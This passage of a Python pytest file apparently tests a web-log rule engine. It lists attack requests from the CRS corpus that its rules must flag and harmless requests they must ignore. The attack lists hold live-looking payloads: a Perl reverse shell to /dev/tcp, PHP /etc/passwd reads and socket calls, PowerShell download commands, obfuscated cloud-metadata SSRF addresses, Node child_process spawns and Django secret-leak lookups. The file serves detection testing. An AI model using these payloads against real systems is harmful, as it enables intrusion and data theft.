    # Empty parens are a call, and the corpus scores them as attacks.
    "/p?x=pi()",
    "/p?x=strip_tags()",
    "/p?x=intval(foo)",
    "/p?x=checkdate()",
    # Files, sockets, decoding, environment.
    "/p?x=file_get_contents('/etc/passwd')",
    "/p?x=fsockopen('evil.test', 4444)",
    "/p?x=symlink()",
    "/p?x=base64_decode('cGhwaW5mbygpOw==')",
    "/p?x=gzinflate(base64_decode($c))",
    "/p?x=phpinfo()",
    "/p?x=php_uname()",
    "/p?x=getenv()",
    # Configuration, wrappers, inclusion, serialised objects.
    "/p?x=allow_url_include",
    "/p?x=memory_limit = 512M",
    "/p?x=extension_dir=/path/to/example",
    "/p?x=php://input",
    "/p?x=php://filter/convert.base64-encode/resource=index.php",
    "/p?x=expect://id",
    "/get/plugins/spamx/BaseAdmin.class.php?_CONF[path]=https://foo.bar",
    "/t.php?src=http://66.240.183.75/crash.php",
    '/p?u=O:8:"stdClass":1:{s:3:"cmd";s:2:"id";}',
]

#: And the other half. Every one of these is a CRS false-positive test: traffic
#: a user reported one of *its* rules firing on, which it then added a case for.
#: They are the reason the rules above are shaped the way they are, and they
#: are far more valuable than the attack list — a miss costs a rule nobody has
#: written, a false alarm discredits every finding the tool makes.
PHP_BENIGN: list[str] = [
    '/get?foo=<?xml version="1.0" encoding="UTF-8"?>',
    '/api/orders?flux=<?xml version="1.0"?><order><id>12345</id></order>',
    '/get?data=<?xml-stylesheet type="text/xsl" href="style.xsl"?>',
    # PHP names functions after ordinary words, and the words come first.
    "/get?foo=executor()",
    "/get?foo=ecosystem()",
    "/get?foo=systems()",
    "/get?foo=system something()",
    "/get?foo=the system is down()",
    "/get?foo=cheval($foo)",
    "/get?foo=audiofile($foo)",
    "/get?foo=the files (yep)",
    "/get?foo=filemtime($foo)",
    # An open paren that never closes is a truncated string, not a call.
    "/get?foo=exec (",
    # A function named rather than called.
    "/get?foo=eval",
    "/post/?test=Moreover, phpinfo can leak sensitive configuration details.",
    "/is_int?a=1",
    # Letters that happen to spell a function name inside a longer word.
    "/post/?test=PaintValdosta",
    "/post/?test=SprintForTheCause",
    "/get?foo=RootAndLeafOpenCamera.jpg",
    "/post/?test=A loaded ghost gun (unserialized) was recovered in the car.",
    "/get?foo=autodescription-site-settings[title_strip_tags]",
    # Brackets and parens in prose, which the `[php]` tag rule must not claim.
    "/get?x=[ACME]: this is, (another) test (foo)bar or foo(bar).",
    "/get?x=(foo)bar or foo(bar) or [foo]bar or foo[bar]",
    '/get?search=this is a "dog" (not a cat)',
    # A URL in a parameter is a redirect, an OAuth callback or a share link far
    # more often than it is remote file inclusion, and one log line cannot tell
    # them apart. Claiming otherwise fires constantly on ordinary traffic.
    "/page?url=https://example.com",
    "/www/delivery/lg.php?bannerid=18&zoneid=4&loc=https%3A%2F%2Fwww.example.com%2Ff",
    # An ERB tag that prints one value is what an output tag is for.
    "/get?x=<%=title%>",
]


@pytest.mark.parametrize("target", PHP_ATTACKS)
def test_php_payloads_are_caught(engine: RuleEngine, target: str) -> None:
    (labelled,) = engine.label_events([request(target)])

    assert labelled.all_labels, f"nothing matched {target!r}"
    assert any(label.category.is_hostile for label in labelled.all_labels)


@pytest.mark.parametrize("target", PHP_BENIGN)
def test_traffic_certified_harmless_stays_quiet(engine: RuleEngine, target: str) -> None:
    """The half of the corpus that is easy to forget, and expensive to fail.

    A rule pack reaches any recall it likes by matching everything. What stops
    that being a good score is being counted when it fires on traffic somebody
    else has already certified as harmless — so these are pinned individually,
    and a regression names the exact request rather than moving a percentage.
    """
    (labelled,) = engine.label_events([request(target)])

    fired = [label.rule_id for label in labelled.all_labels if label.category.is_hostile]
    assert not fired, f"{target!r} was claimed by {fired}"


#: Real paths from the shopfront excerpt's asset bundle, chosen because each
#: one contains a word an action rule is interested in.
WINDOWS_ATTACKS: list[str] = [
    # FOR, in all four switch forms cmd.exe accepts, plus the switchless loop.
    "/get?foo=for /f %variable in (fileset) do command",
    "/get?foo=for /d %variable in (set) do command",
    r"/get?foo=for /r c:\ %variable in (set) do command",
    "/get?foo=for /l %variable in (1,1,2) do command",
    "/get?foo=for %variable in (set) do command",
    "/get?foo=for %%G in (a b c) do echo %%G",
    # IF, which is three syntaxes wearing one word.
    r"/get?foo=if /i not exist c:\nonexistent echo hey",
    "/get?foo=if defined foo echo yes",
    "/get?foo=if errorlevel 1 echo fail",
    "/get?foo=if [%1]==[] echo value missing",
    "/get?foo=if red==red echo test",
    "/get?foo=if not red===red echo test",
    "/get?foo=if 2 geq 15 echo bigger",
    '/get?foo=if "2" geq "15" echo bigger',
    "/get?foo=if (2 geq 15) echo bigger",
    # Naming the interpreter rather than writing syntax for it.
    "/get?cmd=cmd.exe /c dir",
    "/get?x=%COMSPEC% /c whoami",
    "/get?932120-1=Invoke-WebRequest http://example.com/path/file.ps1",
    "/get?cmd=;iwr http://example.com/path/file.ps1",
    "/get?cmd=;iwmi -class Win32_Process -name Create -ArgumentList cmd",
    "/get?x=powershell.exe -inputformat none write 1",
]

#: Requests the CRS corpus certifies as harmless in family 932, and which every
#: pattern in `attack/windows.yaml` was shaped around. Each one is traffic
#: somebody reported a rule firing on, so each is a mistake already paid for by
#: someone else.
WINDOWS_BENIGN: list[str] = [
    # `for` is an English word. A bare for would take this and every search
    # box on the web with it.
    "/get?x=find x for y",
    # `time` is a Windows command and half a company name.
    "/get?foo=time warner",
    "/get?test=time express",
    # `cmd` is the commonest parameter name there is, and this one is prose.
    "/get?cmd=go to store. at the store, shop.",
    # Words that contain command names without being them.
    "/get?word=evaluation",
    "/get?args=environment",
    "/get?args=performance",
    "/get?args=comment",
    "/get?word=schedule",
    # Brackets and globs in ordinary values.
    "/get?page=page[1]",
    "/get?id=does the * shine bright?",
]


@pytest.mark.parametrize("target", WINDOWS_ATTACKS)
def test_windows_batch_payloads_are_caught(engine: RuleEngine, target: str) -> None:
    """CRS family 932 sat at 9% recall until this pack existed, and 163 of the
    368 misses were these shapes. ADR-0007 named Windows batch as the single
    biggest hole a year before the pack was written."""
    (labelled,) = engine.label_events([request(target)])

    assert labelled.all_labels, f"nothing matched {target!r}"
    assert any(label.category.is_hostile for label in labelled.all_labels), (
        f"{target!r} matched only {[one.rule_id for one in labelled.all_labels]}"
    )


@pytest.mark.parametrize("target", WINDOWS_BENIGN)
def test_windows_rules_stay_off_ordinary_words(engine: RuleEngine, target: str) -> None:
    """The half that decides whether the recall above is worth anything.

    Every one of these contains a Windows command name or a batch-looking
    character and is ordinary traffic. A pack that took them would have bought
    45% recall with a tool nobody trusts.
    """
    (labelled,) = engine.label_events([request(target)])

    hostile = [one.rule_id for one in labelled.all_labels if one.category.is_hostile]
    assert not hostile, f"{target!r} was called hostile by {hostile}"


STATIC_ASSETS: list[str] = [
    "/assets/js/autocomplete.js",
    "/assets/js/cart.js",
    "/assets/js/search.js",
    "/assets/js/checkout.js",
    "/assets/css/account.css",
    "/assets/css/layout.css",
    "/assets/img/logo.png",
    "/assets/fonts/inter-400.woff2",
    "/assets/js/app.js?q=1",
    "/assets/css/site.css?v=8",
]


@pytest.mark.parametrize("target", STATIC_ASSETS)
def test_an_action_rule_never_claims_a_static_asset(engine: RuleEngine, target: str) -> None:
    """The bug this guards against cost 1.2 points of accuracy once.

    Action rules run before the fallback that recognises static assets, so an
    unanchored pattern takes the asset with it: `/(search|autocomplete)$` was
    written to catch `/api/autocomplete` and caught `/assets/js/autocomplete.js`
    on 38 requests instead. The bundle of a shop is named after the shop's
    features, so every word an action rule looks for is also a filename there.
    """
    (labelled,) = engine.label_events([request(target)])

    assert labelled.label.category is ActivityCategory.STATIC_ASSET, (
        f"{target!r} was claimed by {[item.rule_id for item in labelled.all_labels]}"
    )


def test_an_action_rule_never_claims_a_crawler(engine: RuleEngine) -> None:
    """A bot fetching `/cart` is a bot. The fallback's crawler branch answers
    *who*, runs before everything else it knows, and must keep doing so once
    rules describe *what* — on this corpus 767 of 814 product-page requests are
    one crawler working through the catalogue."""
    for target in ("/cart", "/checkout", "/search?q=oak", "/account", "/p/67"):
        (labelled,) = engine.label_events([request(target, user_agent="Googlebot/2.1")])

        assert labelled.label.category is ActivityCategory.CRAWLING, (
            f"{target!r} was claimed by {[item.rule_id for item in labelled.all_labels]}"
        )


@pytest.mark.parametrize(
    ("target", "method", "expected_name", "expected_category"),
    [
        ("/cart", "GET", "View Cart", ActivityCategory.BROWSING),
        ("/api/cart/add", "POST", "Modify Cart", ActivityCategory.API_CALL),
        ("/checkout", "POST", "Checkout", ActivityCategory.BROWSING),
        ("/payment/stripe", "GET", "Payment", ActivityCategory.API_CALL),
        ("/account/orders", "GET", "Order History", ActivityCategory.BROWSING),
        ("/track/12345", "GET", "Order Tracking", ActivityCategory.BROWSING),
        ("/search?q=oak", "GET", "Search", ActivityCategory.BROWSING),
        # A search reached as a call, not a page. Two rules match this and the
        # category is the whole difference between them, so asserting the name
        # alone passed while all six of the corpus's requests to it were
        # labelled `browsing`.
        ("/api/autocomplete?q=oa", "GET", "Search", ActivityCategory.API_CALL),
        ("/login", "POST", "Sign In", ActivityCategory.AUTHENTICATION),
        ("/account/password/reset", "POST", "Password Reset", ActivityCategory.AUTHENTICATION),
        ("/upload", "POST", "File Upload", ActivityCategory.API_CALL),
        ("/api/stock?id=3", "GET", "Stock Check", ActivityCategory.API_CALL),
        ("/contact", "POST", "Form Submission", ActivityCategory.API_CALL),
    ],
)
def test_an_action_is_named_by_what_it_was(
    engine: RuleEngine,
    target: str,
    method: str,
    expected_name: str,
    expected_category: ActivityCategory,
) -> None:
    """The point of the whole `action/` tree.

    `POST /checkout` used to be described as "Non-idempotent Request", which
    names the HTTP verb and tells a reader nothing. These names are what makes
    "which of these addresses was a customer?" a question the report answers.
    """
    event = request(target)
    (labelled,) = engine.label_events([replace(event, method=method)])

    assert labelled.label.name == expected_name, (
        f"{method} {target} was called {labelled.label.name!r}"
    )
    assert labelled.label.category is expected_category
    assert not labelled.label.category.is_hostile


#: Real lines from the shopfront excerpt: a `python-requests` client shopping.
#: The truth calls every one of them browsing.
SCRIPTED_BUT_ORDINARY: list[str] = [
    "/c/garden",
    "/search?q=socket",
    "/cart",
    "/download?file=returns-policy.txt",
    "/c/power-tools",
]


@pytest.mark.parametrize("target", SCRIPTED_BUT_ORDINARY)
def test_a_script_doing_ordinary_things_is_not_an_attack(engine: RuleEngine, target: str) -> None:
    """`Scripted Client` may say the client is a program. It may not say the
    client is hostile, because a User-Agent cannot support that claim.

    These twenty requests were the *entire* false-alarm figure on the real log
    — 0.765% of ordinary traffic, all of it one rule reporting `python-requests`
    fetching a catalogue page as reconnaissance. The rule is right that this is
    automated and wrong that it is an attack, and the two had been conflated
    because `is_hostile` is derived from the category.

    ADR-0008 recorded the same mistake once already: `attack-generic` read like
    a family of attacks, was mapped to `injection`, and reported seven proxy
    requests as injection attempts. The fix there was to stop asserting what
    the evidence did not support, and it is the fix here.
    """
    (labelled,) = engine.label_events([request(target, user_agent="python-requests/2.32.3")])

    assert any(item.rule_id == "http_library_user_agent" for item in labelled.all_labels), (
        "the observation itself is useful and must survive"
    )
    assert not labelled.label.category.is_hostile, (
        f"{target!r} from a script was called {labelled.label.category.value}"
    )


def test_a_script_reaching_for_something_it_should_not_is_still_an_attack(
    engine: RuleEngine,
) -> None:
    """The other half, and the reason the rule is not simply deleted. Being a
    script is not an accusation; what the script asked for still is."""
    (labelled,) = engine.label_events([request("/.env", user_agent="python-requests/2.32.3")])

    assert labelled.label.category.is_hostile
    assert labelled.label.rule_id != "http_library_user_agent"


#: Source-tree filenames asked for over HTTP. Every one is a real request from
#: the shopfront excerpt, and the truth calls every one reconnaissance.
METADATA_PROBES: list[str] = [
    "/LICENSE",
    "/README.md",
    "/CHANGELOG.md",
    "/.gitignore",
    "/crossdomain.xml",
    "/.well-known/security.txt",
    "/Dockerfile",
    "/Makefile",
    "/.editorconfig",
    "/.npmrc",
]


@pytest.mark.parametrize("target", METADATA_PROBES)
def test_a_probe_for_project_metadata_is_reconnaissance(engine: RuleEngine, target: str) -> None:
    """What the scripted-client rule was catching by accident, named properly.

    A run of these — `/`, `HEAD /`, `/LICENSE`, `/.gitignore`,
    `/.well-known/security.txt`, `/CHANGELOG.md`, most of them 404 — is a tool
    fingerprinting the stack before it picks an exploit. Sixteen of them were
    being caught only because the client happened to send a `python-requests`
    User-Agent, which is not evidence of anything; the same run from a browser
    User-Agent went entirely unnoticed.
    """
    (labelled,) = engine.label_events([request(target, status=404)])

    matched = {item.category for item in labelled.all_labels}
    assert ActivityCategory.RECONNAISSANCE in matched, (
        f"{target!r} matched {[item.rule_id for item in labelled.all_labels] or 'nothing'}"
    )


@pytest.mark.parametrize("target", ["/robots.txt", "/sitemap.xml", "/favicon.ico"])
def test_the_files_every_crawler_fetches_are_not_probes(engine: RuleEngine, target: str) -> None:
    """The line the rule above must not cross.

    `/robots.txt` and `/sitemap.xml` are fetched 47 times each in this corpus
    and the truth calls every one of them crawling, not reconnaissance. They sit
    at the site root beside the files that *are* probes, and a list assembled by
    theme rather than by evidence would have swept them up.
    """
    (labelled,) = engine.label_events([request(target)])

    assert not any(item.category.is_hostile for item in labelled.all_labels), (
        f"{target!r} was claimed by {[item.rule_id for item in labelled.all_labels]}"
    )


#: SSRF targets written so a host check will not recognise them. Every one is a
#: CRS family 934 case that nothing in this tree caught when the family scored
#: 17%, and they are the largest single shape in that family's misses.
#:
#: The three groups below are three different evasions of the same check, and
#: they need three different patterns because they have nothing in common after
#: the scheme.
SSRF_OBFUSCATED: list[str] = [
    # An internal target named plainly, but in a parameter the old allow-list
    # of names did not cover. `ssrf=` is not `url=`, and an attacker uses
    # whatever the application calls its parameter.
    "/get/test?ssrf=http://169.254.169.254/computeMetadata/v1/",
    "/get/test?ssrf=http://169.254.169.254/metadata/v1.json",
    "/get/test?ssrf=http://169.254.169.254/openstack",
    "/get/test?ssrf=https://metadata.packet.net/userdata",
    "/get/test?ssrf=http://192.0.0.192/latest/user-data/",
    # A scheme with no slashes after it, which browsers and libraries both
    # still resolve.
    "/get/test?ssrf=http:127.0.0.1",
    "/get?ssrf=http://[::]/",
    # The address as one integer. 2852039166 is 169.254.169.254.
    "/get?ssrf=http://2852039166/",
    "/get?ssrf=http://7147006462/",
    "/get?ssrf=http:2852039166",
    "/get?ssrf=http:/2852039166",
    "/get?ssrf=http:123456789",
    # Partly collapsed — two octets joined into one number.
    "/get?ssrf=http://169.254.43518/",
    "/get?ssrf=http://169.16689662/",
    # Hexadecimal, whole or per octet.
    "/get?ssrf=http://0xA9FEA9FE/",
    "/get?ssrf=http://0xA9.0xFE.0xA9.0xFE/",
    "/get?ssrf=http://0x41414141A9FEA9FE/",
    "/get?ssrf=http:0xA9FEA9FE",
    # Octal, which a leading zero is enough to trigger.
    "/get?ssrf=http://0251.0376.0251.0376/",
    "/get?ssrf=http://0251.00376.000251.0000376/",
    "/get?ssrf=ssh://0177.00.00.01",
    "/get?ssrf=rtmp://017700000001",
    "/get?ssrf=http:0251.0376.0251.0376",
    # IPv6, including the mapped forms that carry a v4 address inside.
    "/get?ssrf=http://[::ffff:a9fe:a9fe]",
    "/get?ssrf=http://[0:0:0:0:0:ffff:a9fe:a9fe]",
    "/get?ssrf=http://[0:0:0:0:0:ffff:169.254.169.254]",
    "/get?ssrf=http://[0:0:0:0:0:0:169.254.169.254]",
    "/get?ssrf=xri://[0:0:0:0:0:ffff:169.254.169.254]",
    "/get?ssrf=rsync://[0:0:0:0:0:ffff:169.254.169.254]",
    "/get?ssrf=http:[::ffff:a9fe:a9fe]",
    "/get?ssrf=http://[a::]",
    "/get?ssrf=http://[a::b]",
    "/get?ssrf=http://[dead:beef:dead::beef:dead:beef:dead]",
    "/get?ssrf=http://[fe80::%zone1]",
    "/get?ssrf=http://[fe80::dead:beef:dead:beef:dead:beef%zone1]",
    # A separator that is not a full stop. NFKC folds circled and full-width
    # digits back to ASCII, so those arrive here already plain — but U+3002,
    # the ideographic full stop, is not a compatibility form of `.` and
    # survives normalisation intact.
    "/get?ssrf=http://169\u3002254\u3002169\u3002254/",
    # Backslashes between the letters of a host name, which a permissive
    # resolver strips and a regex for `localhost` does not.
    #
    # **Both counts, and the doubled one is the corpus's.** The first version of
    # this list carried only the single-backslash form, which is what you write
    # if you invent the payload instead of reading it; the pattern was built to
    # match that, the test went green, and the two real cases went on getting
    # through. `query_decoded` for them is
    # `ssrf=http://\\l\\o\\c\\a\\l\\h\\o\\s\\t/` — two backslashes per letter.
    r"/get?ssrf=http://\l\o\c\a\l\h\o\s\t/",
    r"/get?ssrf=http://\g\o\o\g\l\e.\c\o\m/",
    r"/get?ssrf=http://\\l\\o\\c\\a\\l\\h\\o\\s\\t/",
    r"/get?ssrf=http://\\g\\o\\o\\g\\l\\e.\\c\\o\\m/",
]

#: Requests the corpus certifies as harmless that the rules above had to be
#: shaped around. The first is the one that decided the whole design.
SSRF_BENIGN: list[str] = [
    # **This is why every pattern above requires a scheme.** A bare
    # `127.0.0.1` is certified harmless here, and a rule matching the address
    # alone would take it.
    "/get?x=ping 127.0.0.1",
    # A host in a parameter with no scheme at all, which is how an ordinary
    # application passes a domain around.
    "/get/test?url=example.com/",
    # Passing a public URL in a query string is one of the most ordinary
    # things on the web — a redirect, an OAuth callback, a share link.
    "/page?url=https://example.com",
    "/get/www/delivery/lg.php?bannerid=18&campaignid=1&zoneid=4"
    "&loc=https://www.example.com/foo/bar/x-x/x?s=2014-11-01&e=2020-10-31&ex=",
    # Numbers in parameters, which are everywhere, and none of them a host.
    "/get?page=12345678",
    "/get?order=0251",
    # Ordinary words containing scheme-like and host-like fragments.
    "/search?w=hello world",
    "/get?word=evaluation",
    # **From the labelled real log, and the reason the parameter-name
    # allow-list had to go rather than merely grow.** `/admin/ping` is a
    # diagnostic tool and `127.0.0.1` is what you point one at. The old rule
    # matched `host=` plus a loopback address and called four of these SSRF —
    # including one from the legitimate administrator at 192.0.2.22, arriving
    # from a browser with a referer from `/admin/orders`. The truth calls them
    # `access_control` and `reconnaissance`; none of them is SSRF, and `ssrf`
    # precision on that log was 0.429 because of them.
    "/admin/ping?host=127.0.0.1",
]


@pytest.mark.parametrize("target", SSRF_OBFUSCATED)
def test_an_ssrf_target_written_to_evade_a_host_check_is_still_ssrf(
    engine: RuleEngine, target: str
) -> None:
    """CRS family 934 scored 17% and this shape was its largest single miss.

    The evasions are the evidence, not an obstacle to it: nobody writes
    `http://0xA9FEA9FE/` by accident, and an address that has been rewritten to
    get past a check is a stronger signal than the plain one it replaced.
    """
    (labelled,) = engine.label_events([request(target)])

    assert labelled.all_labels, f"nothing matched {target!r}"
    assert any(label.category.is_hostile for label in labelled.all_labels), (
        f"{target!r} matched only {[one.rule_id for one in labelled.all_labels]}"
    )


@pytest.mark.parametrize("target", SSRF_BENIGN)
def test_ssrf_rules_leave_ordinary_urls_and_numbers_alone(engine: RuleEngine, target: str) -> None:
    """The half that decides whether the recall above is worth anything.

    `/get?x=ping 127.0.0.1` is the important one. It carries a loopback address
    and the corpus certifies it harmless, so the address alone cannot be the
    signal — which is why every pattern in the pack requires a URL scheme in
    front of it.
    """
    (labelled,) = engine.label_events([request(target)])

    hostile = [one.rule_id for one in labelled.all_labels if one.category.is_hostile]
    assert not hostile, f"{target!r} was called hostile by {hostile}"


#: Perl's array-interpolation attack: `@{[ ... ]}` inside a string a template
#: renders, which Perl evaluates as code. The largest single shape in CRS family
#: 934's misses — 35 of 122 when this was written, more than Node.js and
#: prototype pollution together.
PERL_INTERPOLATION: list[str] = [
    # The canonical form, and the payloads that go in it.
    "/get?x=@{[system 'whoami']}",
    "/get?x=@{[exec 'whoami']}",
    "/get?x=@{[qx{whoami}]}",
    "/get?x=@{[eval{system 'id'}]}",
    "/get?x=@{[require file::find]}",
    "/get?x=@{[getpwuid($>)]}",
    "/get?x=@{[keys %ENV]}",
    "/get?x=@{[crypt($passwd, 'xx')]}",
    "/get?x=@{[$$]}",
    "/get?x=@{[rand 100]}",
    "/get?x=@{[uc 'hello']}",
    "/get?x=@{[core::time()]}",
    "/get?x=@{[sort { $a <=> $b } (3,2,1)]}",
    "/get?x=@{[system 'bash -c bash -i >& /dev/tcp/10.0.0.1/4242 0>&1']}",
    # Whitespace anywhere, which is why the pattern cannot be a literal.
    "/get?x=@{ [ uc 'hello' ] }",
    '/get?x=@{ [ system "id" ] }',
    "/get?x=@{[ system 'id' ]}",
    # Wrapped, prefixed and decorated — all still an interpolation.
    "/get?x=@{[ (system 'id') ]}",
    "/get?x=@{[ &system 'id' ]}",
    "/get?x=@{[ !!system 'id' ]}",
    "/get?x=@{[ core::system 'id' ]}",
    "/get?x=@{[ do { system 'id' } ]}",
    "/get?x=@{[ system qq{whoami} ]}",
    "/get?x=@{[system 'id' #cmt ]}",
    "/get?x=@@{[core::time()]}",
    "/get?x=@@@@{[core::time()]}",
    # Never closed, or closed and then followed by rubbish. The opening is the
    # evidence; a payload that fails to parse was still sent.
    "/get?x=@{[system 'id']",
    "/get?x=@{[system 'id']extra",
    "/get?x=@{[test][test2]}",
    # In the parameter *name* rather than its value, which is why this matches
    # the whole query rather than something after an `=`.
    "/get?@{[getpwuid($>)]}=value",
]

#: The near misses. Nothing in the CRS corpus's harmless half looks like a Perl
#: interpolation, so these are shapes a real shop would send that share a
#: character or two with it.
PERL_BENIGN: list[str] = [
    "/get?q=fish @ market",
    "/get?email=owner@example.test",
    # `${name}` belongs here by every argument and is deliberately absent.
    # `php_superglobal` calls any `${` PHP variable interpolation at high
    # severity, and no corpus this project holds contains a single `${` — not
    # one in 237,278 real requests, none in the CRS harmless half. So the rule
    # has never been tested against benign template syntax, and asserting it is
    # wrong would be inventing the evidence. Recorded in TODO.md instead.
    "/get?style=@media screen",
    "/get?x=@{here}",
    "/get?handle=@someone",
    "/get?list=a[0]",
]


@pytest.mark.parametrize("target", PERL_INTERPOLATION)
def test_perl_array_interpolation_is_caught(engine: RuleEngine, target: str) -> None:
    """`@{[ ... ]}` is Perl interpolating an array literal, and anything inside
    the brackets runs. It has no other use: nobody sends that sequence by
    accident, which is why one pattern closes thirty-five cases."""
    (labelled,) = engine.label_events([request(target)])

    assert labelled.all_labels, f"nothing matched {target!r}"
    assert any(label.category.is_hostile for label in labelled.all_labels), (
        f"{target!r} matched only {[one.rule_id for one in labelled.all_labels]}"
    )


@pytest.mark.parametrize("target", PERL_BENIGN)
def test_an_at_sign_alone_is_not_perl(engine: RuleEngine, target: str) -> None:
    """The brace and the bracket are both required. An `@` is an email, a CSS
    at-rule and a social handle long before it is Perl."""
    (labelled,) = engine.label_events([request(target)])

    hostile = [one.rule_id for one in labelled.all_labels if one.category.is_hostile]
    assert not hostile, f"{target!r} was called hostile by {hostile}"


#: Reaching Node's globals through a string the application evaluates.
NODEJS_GLOBALS: list[str] = [
    "/get?foo=process.env",
    '/get?foo=process["env"]',
    "/get?foo=process[req.query.a",
    "/get?foo=process[mainModule",
    "/get?foo=console.info(1)",
    '/get?foo=console["info"](1)',
    "/get?foo=console.info.call(this,1)",
    "/get?foo=require[req.query.a",
    "/get?foo=module.exports=",
    "/get?foo=new Function (",
    "/get?foo=this.constructor.constructor",
    "/get?foo=__js_function",
    "/get?foo=eval(String.fromCharCode",
    # Inside a template, which is how it reaches an application at all.
    "/get?foo=#{process.binding(foo).spawn(foo2)}",
    "/get?foo=#{require.main.constructor._load(foo).readdirSync(foo2)}",
    "/get?foo=#{require.main.constructor._load('child_process').spawn('foo',['bar'])}",
    "/get?foo=#{require.main.constructor._load('fs').write(fd, str, 0, null, {})}",
]

#: Poisoning `Object.prototype` through the parameter *name*, which is the one
#: place in this tree an attack lives left of the `=`.
NODEJS_POLLUTION: list[str] = [
    "/get?__proto__[test]=test",
    "/get?__proto__.test=test",
    '/get?__proto__[test]={"json":"value"}',
    "/get?__proto__[jquery]=x",
    "/get?__proto__[v-bind:class]=''.constructor.constructor('alert(1)')()",
    "/get?constructor.prototype.test=test",
    "/get?constructor.prototype. test=test",
    "/get?constructor[prototype][test]=test",
    "/get?x=x&a[constructor][prototype]=image&a[constructor][prototype][onerror]=a",
]

#: A loop that never ends, which is a denial of service rather than an entry.
#: **The harmless half draws the line one character away**: `while(!true)`
#: evaluates false and never runs, and the corpus certifies it harmless.
NODEJS_ENDLESS: list[str] = [
    "/get?eval=while(true);",
    "/get?eval=while((true)))",
    "/get?eval=while(!false)",
    "/get?eval=while(!0);",
    "/get?eval=while(!-0);",
    '/get?eval=while(!"");',
    "/get?eval=while(!'');",
    "/get?eval=while(!``);",
    "/get?eval=while(!null)",
    "/get?eval=while(!undefined)",
    "/get?eval=while(!NaN)",
    "/get?eval=while(!!{});",
    "/get?eval=while(!![]);",
    '/get?eval=while(!!"");',
    "/get?eval=while(!!'');",
    "/get?eval=while(!!``);",
    "/get?eval=while(Infinity);",
    "/get?eval=while(-Infinity);",
    "/get?eval=while(-1);",
    "/get?eval=while(new Date);",
    "/get?eval=while(this);",
    "/get?eval=while(String);",
]

#: Every one of these is certified harmless by the CRS corpus, and they are the
#: specification for the three lists above.
NODEJS_BENIGN: list[str] = [
    # A bare global with nothing reached off it. `process.` is not `process.env`.
    "/get?foo=process.",
    "/get?foo=console.",
    # A loop whose condition is false: it never runs, so it is not a loop.
    "/get?eval=while(!true);",
    # English that happens to contain a keyword.
    "/get?text=while (foo) is bar.",
    # Template syntax with an ordinary name inside. The braces are not the
    # evidence — what is reached through them is.
    "/get?x=#{name}",
    "/get?x={{username}}",
    "/get?x=<%=title%>",
    # `{% if true %}49{% endif %}` was on this list for a day, under a comment
    # saying the corpus certifies it harmless. The corpus says the opposite: it
    # is an SSTI probe, and an attack nothing here catches yet. A benign list is
    # a list of things a rule must *never* match, so an attack on it does not
    # merely go unnoticed — it blocks the rule that would one day catch it.
]


@pytest.mark.parametrize("target", NODEJS_GLOBALS)
def test_reaching_a_node_global_is_caught(engine: RuleEngine, target: str) -> None:
    """`process`, `require`, `module` and `console` are how a Node payload gets
    out of the template it was interpolated into and into the runtime."""
    (labelled,) = engine.label_events([request(target)])

    hostile = [one.rule_id for one in labelled.all_labels if one.category.is_hostile]
    assert hostile, f"nothing called {target!r} hostile"


@pytest.mark.parametrize("target", NODEJS_POLLUTION)
def test_prototype_pollution_in_a_parameter_name_is_caught(engine: RuleEngine, target: str) -> None:
    """**The payload is left of the `=`, which nothing else in this tree does.**
    A pattern written out of habit anchors on a value and misses all nine."""
    (labelled,) = engine.label_events([request(target)])

    hostile = [one.rule_id for one in labelled.all_labels if one.category.is_hostile]
    assert hostile, f"nothing called {target!r} hostile"


@pytest.mark.parametrize("target", NODEJS_ENDLESS)
def test_a_loop_that_never_ends_is_caught(engine: RuleEngine, target: str) -> None:
    """Every condition here is always truthy, so the loop runs until the process
    is killed. The list is an enumeration rather than a pattern because the set
    of always-true JavaScript literals is finite and `while(!true)` is not in
    it."""
    (labelled,) = engine.label_events([request(target)])

    hostile = [one.rule_id for one in labelled.all_labels if one.category.is_hostile]
    assert hostile, f"nothing called {target!r} hostile"


@pytest.mark.parametrize("target", NODEJS_BENIGN)
def test_the_node_rules_leave_the_certified_harmless_alone(engine: RuleEngine, target: str) -> None:
    """Straight out of the CRS corpus's harmless half for family 934, and the
    reason each of the three rules above is shaped the way it is."""
    (labelled,) = engine.label_events([request(target)])

    hostile = [one.rule_id for one in labelled.all_labels if one.category.is_hostile]
    assert not hostile, f"{target!r} was called hostile by {hostile}"


#: Django ORM lookups aimed at what a filter must never reach. The first two are
#: the CRS corpus's (family 934); the rest are the classic leak, a secret read
#: one character at a time through a prefix match.
PYTHON_ORM_PROBES: list[str] = [
    "/get?data__has_key=is_admin",
    "/get?user__metadata__has_keys=is_staff",
    "/get?user__password__startswith=pbkdf2_sha256",
    "/get?owner__api_key__istartswith=sk-",
    "/get?author__user__password__regex=^a",
    "/get?reset_token__gte=a",
    "/get?q=shoes&profile__settings__has_any_keys=is_superuser",
]

#: What a Django site sends on purpose. django-filter and the admin build these
#: URLs for ordinary users, so none of them is evidence of anything.
PYTHON_ORM_BENIGN: list[str] = [
    # Single-level lookups: CRS itself only flags these at paranoia level 3.
    "/get?username__startswith=p",
    "/get?balance__gte=1000",
    "/get?email__iendswith=example.com",
    "/get?price__lte=100&category__slug=shoes",
    # The admin's own list filters, privilege flags included.
    "/admin/auth/user/?is_staff__exact=1",
    "/admin/auth/user/?is_superuser__exact=0&is_active__exact=1",
    # A secret named without a lookup is a parameter, not a probe.
    "/reset?token=4f9a2c",
    "/get?password=hunter2",
    # A JSON-key lookup for an ordinary key.
    "/get?data__has_key=colour",
]


@pytest.mark.parametrize("target", PYTHON_ORM_PROBES)
def test_an_orm_lookup_on_a_secret_or_privilege_flag_is_caught(
    engine: RuleEngine, target: str
) -> None:
    """The filter is the attacker's: a prefix match walks a password hash out
    one character at a time, and a key lookup asks which rows are admins."""
    (labelled,) = engine.label_events([request(target)])

    hostile = [one.rule_id for one in labelled.all_labels if one.category.is_hostile]
    assert hostile, f"nothing called {target!r} hostile"


@pytest.mark.parametrize("target", PYTHON_ORM_BENIGN)
def test_ordinary_django_filters_are_left_alone(engine: RuleEngine, target: str) -> None:
    """A lookup is how Django filters, so the lookup is never the evidence —
    what it is aimed at is."""
    (labelled,) = engine.label_events([request(target)])

    hostile = [one.rule_id for one in labelled.all_labels if one.category.is_hostile]
    assert not hostile, f"{target!r} was called hostile by {hostile}"


#: An internal host named rather than addressed. `ssrf_internal_target` wants a
#: scheme in front — `http://localhost` — and these carry none, which is how
#: fourteen corpus cases walked past it.
SSRF_INTERNAL_NAMES: list[str] = [
    "/get/test?url=localhost/",
    "/get/test?url=localhost.localdomain/",
    "/get/test?url=localhost4/",
    "/get/test?url=localhost4.localdomain4/",
    "/get/test?url=ipv6-localhost/",
